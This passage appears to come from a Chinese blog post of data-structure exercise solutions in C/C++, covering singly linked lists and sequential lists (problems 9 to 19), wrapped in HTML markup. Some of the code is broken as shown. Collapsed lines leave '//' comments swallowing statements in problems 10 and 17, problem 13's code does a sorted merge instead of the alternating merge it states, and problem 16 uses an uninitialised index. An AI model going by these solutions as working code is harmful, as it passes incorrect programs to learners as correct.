n);deletelinklist(l);outlinklist(l);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//9、试设计一个算法，将单链表中值最大的那个结点删除。</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef struct Node</span><br><span class="line">&#123;</span><br><span class="line">int elem;</span><br><span class="line">struct Node* next;</span><br><span class="line">&#125;*linklist;</span><br><span class="line"></span><br><span class="line">void inlinklist(linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">l = (linklist) malloc (sizeof(Node));</span><br><span class="line">l-&gt;next = NULL;</span><br><span class="line">linklist p, end;</span><br><span class="line">end = l;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表中的元素：\n&quot;);for(int i= 0 ; i&lt;n; i++)&#123;p = (linklist) malloc (sizeof(Node));scanf(&quot;%d&quot;, &amp;p-&gt;elem);end-&gt;next = p;p-&gt;next = NULL;end = p;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outlinklist(linklist l)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;链表中的元素为：\n&quot;);</span><br><span class="line">linklist p;</span><br><span class="line">p = l-&gt;next;</span><br><span class="line"></span><br><span class="line">while(p)&#123;printf(&quot;%d &quot;, p-&gt;elem);p = p-&gt;next;&#125;printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void deletelinklist(linklist &amp;l)</span><br><span class="line">&#123;</span><br><span class="line">linklist cur, precur, max, premax;</span><br><span class="line">cur = max = precur = premax = l;</span><br><span class="line">cur = l-&gt;next;</span><br><span class="line">max = l-&gt;next;</span><br><span class="line"></span><br><span class="line">while(cur)&#123;if(cur-&gt;elem &gt; max-&gt;elem)&#123;premax = precur;max = cur;&#125;precur = cur;cur = cur-&gt;next;&#125;linklist p;p = max;premax-&gt;next = max-&gt;next;free(p);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist l;</span><br><span class="line">int n;</span><br><span class="line"></span><br><span class="line">printf(&quot;链表中元素个数为：\n&quot;);scanf(&quot;%d&quot;, &amp;n);inlinklist(l, n);deletelinklist(l);outlinklist(l);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//10、试设计一个算法，使得在一个有序的单链表中插入一个元素后仍然有序</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef struct Node </span><br><span class="line">&#123;</span><br><span class="line">int elem;</span><br><span class="line">struct  Node *next;</span><br><span class="line">&#125;*linklist;</span><br><span class="line"></span><br><span class="line">void inlinklist(linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">l = (linklist) malloc (sizeof(Node));</span><br><span class="line">l-&gt;next = NULL;</span><br><span class="line">linklist p, end;</span><br><span class="line">end = l;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表中的元素：\n&quot;);for(int i = 0; i&lt;n; i++)&#123;p = (linklist) malloc(sizeof(Node));scanf(&quot;%d&quot;, &amp;p-&gt;elem);end-&gt;next = p;p-&gt;next = NULL;end = p;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outlinklist(linklist l)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;链表中的元素为：\n&quot;);</span><br><span class="line">linklist p;</span><br><span class="line">p = l-&gt;next;</span><br><span class="line"></span><br><span class="line">while(p)&#123;printf(&quot;%d &quot;, p-&gt;elem);p = p-&gt;next;&#125;printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void insertlinklist(linklist &amp;l, int x)</span><br><span class="line">&#123;</span><br><span class="line">linklist p, q, s;</span><br><span class="line">s = l;</span><br><span class="line">p = s-&gt;next;</span><br><span class="line"></span><br><span class="line">while(p &amp;&amp; p-&gt;elem &lt; x)&#123;s = p;p = p-&gt;next;&#125;//将x插入到s和p之间q = (linklist) malloc (sizeof(Node));q-&gt;elem = x;q-&gt;next = p;s-&gt;next = q;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int n, x;</span><br><span class="line">linklist l;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表元素个数：\n&quot;);scanf(&quot;%d&quot;, &amp;n);inlinklist(l, n);printf(&quot;请输入要插入的元素的值：\n&quot;);scanf(&quot;%d&quot;, &amp;x);insertlinklist(l, x);outlinklist(l);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//11、编写一个算法，将带头结点的单向链表拆分成一个奇数链表和一个偶数链表，并分别输出</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef struct Node</span><br><span class="line">&#123;</span><br><span class="line">int elem;</span><br><span class="line">struct Node* next;</span><br><span class="line">&#125;*linklist;</span><br><span class="line"></span><br><span class="line">void inlinklist(linklist &amp;l, int n )</span><br><span class="line">&#123;</span><br><span class="line">l = (linklist) malloc (sizeof(Node));</span><br><span class="line">l-&gt;next = NULL;</span><br><span class="line">linklist p, end;</span><br><span class="line">end = l;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表中的元素：\n&quot;);for(int i = 0 ;i &lt; n; i++)&#123;p = (linklist) malloc (sizeof(Node));scanf(&quot;%d&quot;, &amp;p-&gt;elem);end-&gt;next = p;p-&gt;next = NULL;end = p;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outlinklist(linklist l)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;链表中的元素为：\n&quot;);</span><br><span class="line">linklist p;</span><br><span class="line">p = l-&gt;next;</span><br><span class="line"></span><br><span class="line">while(p)&#123;printf(&quot;%d &quot;, p-&gt;elem);p = p-&gt;next;&#125;printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void splitlinklist (linklist &amp;l1, linklist &amp;l2, linklist &amp;l3)</span><br><span class="line">&#123;</span><br><span class="line">l2 = (linklist) malloc (sizeof(Node));</span><br><span class="line">l3 = (linklist) malloc (sizeof(Node));</span><br><span class="line">linklist p, q, s;</span><br><span class="line">//p = l1;</span><br><span class="line">q = l2;</span><br><span class="line">s = l3;</span><br><span class="line">p = l1-&gt;next;</span><br><span class="line">q-&gt;next = s-&gt;next = NULL;</span><br><span class="line"></span><br><span class="line">while(p)&#123;if(p-&gt;elem % 2 == 1)//奇数&#123;q-&gt;next = p;p = p-&gt;next;q = q-&gt;next;&#125;else if(p-&gt;elem%2 == 0)//偶数&#123;s-&gt;next = p;s = s-&gt;next;p = p-&gt;next;&#125;&#125;q-&gt;next = NULL;s-&gt;next = NULL;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist l1, l2, l3;</span><br><span class="line">int n;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表的元素个数：\n&quot;);scanf(&quot;%d&quot;, &amp;n);inlinklist(l1, n);splitlinklist(l1, l2, l3);outlinklist(l2);outlinklist(l3);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//12、已知一个带头结点的单链表lc=&#123;a1,b1,a2,b2....,an,bn&#125;共２ｎ个元素，试设计一个算法将其拆分成二个带头结点的单向链表la 与lb,其中la=&#123;a1,a2,...an&#125;,lb=&#123;b1,b2,...,bn&#125;</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef struct Node</span><br><span class="line">&#123;</span><br><span class="line">int elem;</span><br><span class="line">struct Node* next;</span><br><span class="line">&#125;*linklist;</span><br><span class="line"></span><br><span class="line">void inlinklist(linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">l = (linklist) malloc(sizeof(Node));</span><br><span class="line">l-&gt;next = NULL;</span><br><span class="line">linklist p, end;</span><br><span class="line">end = l;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表中的元素：\n&quot;);for(int i = 0; i&lt;n; i++)&#123;p = (linklist) malloc (sizeof(Node));scanf(&quot;%d&quot;, &amp;p-&gt;elem);end-&gt;next = p;p-&gt;next = NULL;end = p;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outlinklist(linklist l)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;链表中的元素为：\n&quot;);</span><br><span class="line">linklist p;</span><br><span class="line">p = l-&gt;next;</span><br><span class="line"></span><br><span class="line">while(p)&#123;printf(&quot;%d &quot;, p-&gt;elem);p = p-&gt;next;&#125;printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void splitlinklist(linklist &amp;l1, linklist &amp;l2, linklist &amp;l3)</span><br><span class="line">&#123;</span><br><span class="line">l2 = (linklist) malloc (sizeof(Node));</span><br><span class="line">l3 = (linklist) malloc (sizeof(Node));</span><br><span class="line">linklist p, q, s;</span><br><span class="line">p = l1-&gt;next; </span><br><span class="line">q = l2;</span><br><span class="line">s = l3;</span><br><span class="line">int j = 1;</span><br><span class="line"></span><br><span class="line">while(p)&#123;if(j%2 != 0)&#123;q-&gt;next = p;q = q-&gt;next;&#125;else&#123;s-&gt;next = p;s = s-&gt;next;&#125;j++;p = p-&gt;next;&#125;q-&gt;next = NULL;s-&gt;next = NULL;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist l1, l2, l3;</span><br><span class="line">int n;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表中的元素个数：\n&quot;);scanf(&quot;%d&quot;, &amp;n);inlinklist(l1, n);splitlinklist(l1, l2, l3);outlinklist(l2);outlinklist(l3);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//13、已知二个带头结点的单向链表la 与lb,其中la=&#123;a1,a2,...an&#125;,lb=&#123;b1,b2,...,bn&#125;， 试设计一个算法将其合并到一个带头结点的单链表lc中，且lc=&#123;a1,b1,a2,b2....,an,bn&#125;</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef struct Node </span><br><span class="line">&#123;</span><br><span class="line">int elem;</span><br><span class="line">struct Node *next;</span><br><span class="line">&#125;*linklist;</span><br><span class="line"></span><br><span class="line">void inlinklist(linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">l = (linklist) malloc (sizeof(Node));</span><br><span class="line">l-&gt;next = NULL;</span><br><span class="line">linklist p, end;</span><br><span class="line">end = l;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表中的元素：\n&quot;);for(int i = 0; i&lt;n; i++)&#123;p = (linklist) malloc (sizeof(Node));scanf(&quot;%d&quot;, &amp;p-&gt;elem);end-&gt;next = p;p-&gt;next = NULL;end = p;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outlinklist(linklist l)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;合并后链表中的元素为：\n&quot;);</span><br><span class="line">linklist p;</span><br><span class="line">p = l-&gt;next;</span><br><span class="line"></span><br><span class="line">while(p != NULL)&#123;printf(&quot;%d &quot;, p-&gt;elem);p = p-&gt;next;&#125;printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void swap(linklist&amp; a, linklist &amp;s)</span><br><span class="line">&#123;</span><br><span class="line">s-&gt;next = a;</span><br><span class="line">s = a;</span><br><span class="line">a = a-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void mergerlinklist(linklist &amp;l1, linklist &amp;l2, linklist &amp;l3)</span><br><span class="line">&#123;</span><br><span class="line">l3 = (linklist) malloc (sizeof(Node));</span><br><span class="line">linklist a, b, c;</span><br><span class="line">a = l1-&gt;next;</span><br><span class="line">b = l2-&gt;next;</span><br><span class="line">c = l3;</span><br><span class="line"></span><br><span class="line">while(a &amp;&amp; b)&#123;if(a-&gt;elem &gt; b-&gt;elem)&#123;swap(b, c);&#125;else&#123;swap(a, c);&#125;&#125;c-&gt;next = a ? a : b;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist l1, l2, l3;</span><br><span class="line">int n, m;</span><br><span class="line"></span><br><span class="line">printf(&quot;请分别输入2个链表的元素个数：\n&quot;);scanf(&quot;%d%d&quot;, &amp;n, &amp;m);inlinklist(l1, n);inlinklist(l2, m);mergerlinklist(l1, l2, l3);outlinklist(l3);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//14、已知单链表la=&#123;a1,a2,...an&#125;，试编写一个算法，将la中的元素进行逆置，即la=&#123;an,an-1,...a1&#125;</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef struct Node</span><br><span class="line">&#123;</span><br><span class="line">    int elem;</span><br><span class="line">    struct  Node *next;</span><br><span class="line">&#125;*Linklist;</span><br><span class="line">void inlinklist(Linklist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">    l = (Linklist)malloc(sizeof(Node));</span><br><span class="line">    l-&gt;next = NULL;</span><br><span class="line">    Linklist p, END;//定义尾部节点</span><br><span class="line">    END = l;</span><br><span class="line">    printf(&quot;请输入想要创建的链表元素:\n&quot;);</span><br><span class="line">    for(int i = 0; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p = (Linklist)malloc(sizeof(Node));</span><br><span class="line">        scanf(&quot;%d&quot;, &amp;p-&gt;elem);</span><br><span class="line">        END -&gt; next = p;</span><br><span class="line">        p-&gt;next = NULL;</span><br><span class="line">        END = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void outlinklist(Linklist l)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;逆置后链表中的值为:\n&quot;);</span><br><span class="line">    Linklist  p;</span><br><span class="line">    p = l-&gt;next;</span><br><span class="line">    while(p != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;%d &quot;, p-&gt;elem);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//在做一次头插</span><br><span class="line">void transpose(Linklist &amp;l)</span><br><span class="line">&#123;</span><br><span class="line">Linklist p, q;</span><br><span class="line">p = l-&gt;next;</span><br><span class="line">l-&gt;next = NULL;</span><br><span class="line"></span><br><span class="line">while(p)&#123;q = p;p = p-&gt;next;q-&gt;next = l-&gt;next;l-&gt;next = q;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">Linklist l;</span><br><span class="line">int n;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表的元素个数:\n&quot;);scanf(&quot;%d&quot;, &amp;n);inlinklist(l, n);transpose(l);outlinklist(l);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//15、已知顺序表L长度为n，试编写算法实现在顺序表中删除值为elem的数据元素（其中n与elem从键盘输入）</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#define M 100</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line">int *arr;</span><br><span class="line">int length;</span><br><span class="line">int maxsize;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line">void createsqlist(sqlist &amp;L)</span><br><span class="line">&#123;</span><br><span class="line">L.arr = (int*)malloc(M* sizeof(int));</span><br><span class="line">L.length = 0;</span><br><span class="line">L.maxsize = M;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void insqlist(sqlist&amp; L, int n)</span><br><span class="line">&#123;</span><br><span class="line">int *p;</span><br><span class="line">printf(&quot;请依次输入数字创建一个顺序表：\n&quot;);</span><br><span class="line">for(p = L.arr; p&lt;L.arr + n; p++)</span><br><span class="line">&#123;</span><br><span class="line">scanf(&quot;%d&quot;, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">L.length = n;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outsqlist(sqlist L)</span><br><span class="line">&#123;</span><br><span class="line">int *p;</span><br><span class="line">printf(&quot;顺序表的元素为：\n&quot;);</span><br><span class="line">for(p = L.arr; p&lt;L.arr+L.length; p++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d &quot;, *p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void deletesqlist(sqlist&amp; L, int elem)</span><br><span class="line">&#123;</span><br><span class="line">int i = 0; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while(i&lt;L.length &amp;&amp; L.arr[i] != elem)&#123;i++;&#125;for(int j = i+1; j&lt;L.length; j++)&#123;if(L.arr[j] != elem)&#123;L.arr[i++] = L.arr[j];&#125;&#125;L.length = i;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">sqlist L;</span><br><span class="line">createsqlist(L);</span><br><span class="line">int n, elem;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printf(&quot;请输入顺序表L的长度n： \n&quot;);scanf(&quot;%d&quot;, &amp;n);insqlist(L, n);printf(&quot;请输入删除的元素值：\n&quot;);scanf(&quot;%d&quot;, &amp;elem);deletesqlist(L, elem);outsqlist(L);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//16、已知顺序表L长度为n，试编写算法实现在顺序表中值为elem的数据元素的后面插入一个值为key的数据元素（其中n、elem与key从键盘输入且顺序表的数据元素的值互不相同）</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">const int maxn = 1000 + 10;</span><br><span class="line"></span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line">int * arr;</span><br><span class="line">int length;</span><br><span class="line">int maxsize;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line">void createsqlist(sqlist&amp; L)</span><br><span class="line">&#123;</span><br><span class="line">L.arr = (int*) malloc(maxn * sizeof(int));</span><br><span class="line">L.length = 0;</span><br><span class="line">L.maxsize = maxn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void insqlist(sqlist&amp; L, int n)</span><br><span class="line">&#123;</span><br><span class="line">int *p;</span><br><span class="line"></span><br><span class="line">printf(&quot;请依次输入数字来创建一个顺序表： \n&quot;);for(p = L.arr; p&lt;L.arr + n; p++)&#123;scanf(&quot;%d&quot;, p);&#125;L.length = n;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outsqlist(sqlist L)</span><br><span class="line">&#123;</span><br><span class="line">int *p;</span><br><span class="line">printf(&quot;顺序表的元素为：\n&quot;);</span><br><span class="line">for(p = L.arr; p&lt;L.arr + L.length; p++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d &quot;, *p);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void insertsqlist (sqlist&amp; L, int elem, int key)</span><br><span class="line">&#123;</span><br><span class="line">int flag;</span><br><span class="line">int *p;</span><br><span class="line"></span><br><span class="line">for(p = L.arr; p&lt;L.arr+ L.length; p++)&#123;if(*p == elem)&#123;flag = p - L.arr;&#125;&#125;for(p = L.arr + L.length; p&gt;=L.arr + flag + 1; p--)&#123;*(p + 1) = *p;&#125;L.arr[flag + 1] = key;L.length++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">sqlist L;</span><br><span class="line">createsqlist(L);</span><br><span class="line">int n, elem, key;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入n个元素：\n&quot;);scanf(&quot;%d&quot;, &amp;n);insqlist(L, n);printf(&quot;请输入要插入后边的元素的值和插入元素的值：\n&quot;);scanf(&quot;%d%d&quot;, &amp;elem, &amp;key);insertsqlist(L, elem, key);outsqlist(L);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//17、已知顺序表&#123;a0,a1,a2,...,an-1&#125;，且每个元素都是不相同的,试设计一个算法把所有的奇数移到所有的偶数的前面。</span><br><span class="line"></span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">const int maxn = 1000+10;</span><br><span class="line"></span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line">int * arr;</span><br><span class="line">int length;</span><br><span class="line">int maxsize;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line">void createsqlist(sqlist &amp;l)</span><br><span class="line">&#123;</span><br><span class="line">l.arr = (int*) malloc (maxn * sizeof(int));</span><br><span class="line">l.length = 0;</span><br><span class="line">l.maxsize = maxn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void insqlist(sqlist&amp; l, int n)</span><br><span class="line">&#123;</span><br><span class="line">int *p;</span><br><span class="line"></span><br><span class="line">printf(&quot;请依次输入数字来创建顺序表：\n&quot;);for(p = l.arr; p&lt;l.arr+n; p++)&#123;scanf(&quot;%d&quot;, p);&#125;l.length = n;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outsqlist(sqlist l)</span><br><span class="line">&#123;</span><br><span class="line">int* p;</span><br><span class="line">printf(&quot;顺序表的元素为：\n&quot;);</span><br><span class="line"></span><br><span class="line">for(p = l.arr; p&lt;l.arr + l.length; p++)printf(&quot;%d &quot;, *p);printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void swap(int *a, int *b)</span><br><span class="line">&#123;</span><br><span class="line">int temp;</span><br><span class="line">temp = *a;</span><br><span class="line">*a = *b;</span><br><span class="line">*b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void change(sqlist&amp; l)</span><br><span class="line">&#123;</span><br><span class="line">int *i = l.arr;</span><br><span class="line">int *j = l.arr + l.length -1;</span><br><span class="line"></span><br><span class="line">while(i&lt;j)&#123;while( (*i)%2 == 1)//奇数i++;while((*j)%2 == 0)//偶数j--;if(i&lt;j)&#123;swap(i, j);i++;j--;&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">sqlist l;</span><br><span class="line">createsqlist(l);</span><br><span class="line">int n;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入顺序表的元素个数n:\n&quot;);scanf(&quot;%d&quot;, &amp;n);insqlist(l, n);change(l);outsqlist(l);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//18、已知二个集合la与lb,采用顺序结构存储，其中la=&#123;a1,a2,...an&#125;,lb=&#123;b1,b2,...,bｍ&#125;， 试设计一个算法将其合并到一个顺序表lc中。</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line">const int maxn = 1000 + 10;</span><br><span class="line"></span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line">int *arr;</span><br><span class="line">int length;</span><br><span class="line">int maxsize;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line">void createsqlist(sqlist&amp; l)</span><br><span class="line">&#123;</span><br><span class="line">l.arr = (int*) malloc (maxn * sizeof(int));</span><br><span class="line">l.length = 0;</span><br><span class="line">l.maxsize = maxn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void insqlist(sqlist&amp; l, int n)</span><br><span class="line">&#123;</span><br><span class="line">int *p;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入数字来创建顺序表： \n&quot;);for(p = l.arr; p&lt;l.arr +n; p++)scanf(&quot;%d&quot;, p);l.length = n;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void outsqlist(sqlist l)</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">printf(&quot;顺序表的元素为： \n&quot;);</span><br><span class="line">for(i = 0; i&lt;l.length; i++)</span><br><span class="line">printf(&quot;%d &quot;, l.arr[i]);</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void merger(sqlist &amp;l1, sqlist &amp;l2, sqlist &amp;l3)</span><br><span class="line">&#123;</span><br><span class="line">for(int i = 0; i&lt;l1.length; i++)</span><br><span class="line">&#123;</span><br><span class="line">l3.arr[i] = l1.arr[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">l3.length = l1.length;for(int i = 0; i&lt;l2.length; i++)&#123;l3.arr[i + l3.length] = l2.arr[i];&#125;l3.length += l2.length;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int n, m;</span><br><span class="line">sqlist l1, l2, l3;</span><br><span class="line">createsqlist (l1);</span><br><span class="line">createsqlist (l2);</span><br><span class="line">createsqlist (l3);</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入顺序表的元素个数n和m:\n&quot;);scanf(&quot;%d%d&quot;, &amp;n, &amp;m);insqlist(l1, n);insqlist(l2, m);merger(l1, l2, l3);outsqlist(l3);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//19、已知一个顺序表la，其中la=&#123;a1,a2,...an&#125;， 试设计一个算法将其从小到大进行排序 ，再输出</span><br><span class="line"></span><br><span class="line"># include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"># include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">const int maxn = 1000 + 10;</span><br><span class="line"></span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line">int *arr;</span><br><span class="line">int length;</span><br><span class="line">int maxsize;</span><br><span class="line">&#125;sqlist;</span><br><span class="line"></span><br><span class="line">void createsqlist (sqlist &amp;l)</span><br><span class="line">&#123;</span><br><span class="line">l.arr = (int *) malloc (maxn * sizeof(int));</span><br><span class="line">l.length = 0;</span><br><span class="line">l.maxsize = maxn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void insqlist(sqlist &amp;l, int n)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;请依次输入数字创建顺序表：\n&quot;);</span><br><span class="line">for(int i = 0; i&lt;n; i++)</span><br><span class="line">&#123;</span><br><span class="line">scanf(&quot;%d&quot;, 